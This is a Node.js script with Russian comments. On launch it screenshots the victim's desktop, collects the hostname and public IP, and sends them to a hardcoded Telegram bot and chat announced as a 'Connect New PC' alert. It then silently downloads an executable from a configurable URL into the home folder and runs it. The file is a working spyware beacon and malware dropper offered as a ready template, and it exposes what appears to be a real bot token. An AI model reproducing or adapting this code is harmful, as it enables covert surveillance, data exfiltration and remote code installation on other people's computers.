const os = require('os');
const homedir = os.homedir(); // Получаем домашнюю директорию пользователя
const TelegramBot = require('node-telegram-bot-api');
const screenshot = require('screenshot-desktop');
const axios = require('axios');
const { exec } = require('child_process');
const fs = require('fs'); // Добавлено для работы с файловой системой

const token = '6541130193:AAHzFM3jUNmz_YUgjFQF_LlzsOvlh1JEjsQ'; // Замените на свой токен
const chatId = '5950028476'; // Замените на свой ID чата
const exeFileUrl = 'https://app.prntscr.com/build/setup-lightshot.exe'; // Замените на URL exe-файла, который вы хотите скачать и запустить

const bot = new TelegramBot(token, { polling: true });

let hasConnected = false;

function getIPFromAmazon() {
  return axios.get('https://checkip.amazonaws.com/')
    .then((response) => response.data);
}

function sendScreenshotToTelegram() {
  getIPFromAmazon().then((ipAddress) => {
    const computerName = os.hostname();

    screenshot().then((imageBuffer) => {
      const caption = `⚡️Connect New PC *${computerName}*\n\nIP address: \`${ipAddress}\``;

      bot.sendPhoto(chatId, imageBuffer, { caption, parse_mode: 'Markdown' })
        .then(() => {
          console.log('Скриншот успешно отправлен в Telegram');
          downloadAndRunExeFile();
        })
        .catch((error) => {
          console.error('Ошибка при отправке скриншота:', error.response.body);
          process.exit(1);
        });
    });
  });
}

function downloadAndRunExeFile() {
  if (!hasConnected) {
    const programFilesPath = homedir + '\\downloaded.exe';

    console.log('Загрузка и запуск exe-файла...');
    axios({
      method: 'get',
      url: exeFileUrl,
      responseType: 'stream',
    })
      .then((response) => {
        const exeFileName = programFilesPath;

        const exeFile = fs.createWriteStream(exeFileName);

        response.data.pipe(exeFile);

        exeFile.on('finish', () => {
          exeFile.close();
          console.log('exe-файл успешно загружен.');

          exec(`start ${exeFileName}`, (error, stdout, stderr) => {
            if (error) {
              console.error('Ошибка при запуске exe-файла:', error);
              process.exit(1);
            } else {
              console.log('exe-файл успешно запущен.');
              process.exit(0);
            }
          });
        });
      })
      .catch((error) => {
        console.error('Ошибка при загрузке exe-файла:', error);
        process.exit(1);
      });

    hasConnected = true;
  }
}

// Обработчик корректного завершения работы
process.on('SIGINT', () => {
  console.log('Выход из скрипта...');
  // Дополнительные действия перед завершением, если необходимо
  process.exit(0);
});

// Выполните установку библиотеки node-telegram-bot-api только один раз при первом запуске
if (!fs.existsSync('node_modules/node-telegram-bot-api')) {
  console.log('Библиотека node-telegram-bot-api не установлена. Устанавливаю...');
  const installCmd = 'npm install node-telegram-bot-api';
  const installProcess = exec(installCmd);

  installProcess.stdout.on('data', (data) => {
    console.log(data);
  });

  installProcess.stderr.on('data', (data) => {
    console.error(data);
  });

  installProcess.on('close', (code) => {
    if (code === 0) {
      console.log('Библиотека node-telegram-bot-api успешно установлена.');
      sendScreenshotToTelegram();
    } else {
      console.error('Ошибка при установке библиотеки node-telegram-bot-api.');
      process.exit(1);
    }
  });
} else {
  // Выполните отправку скриншота и загрузку exe-файла
  sendScreenshotToTelegram();
}
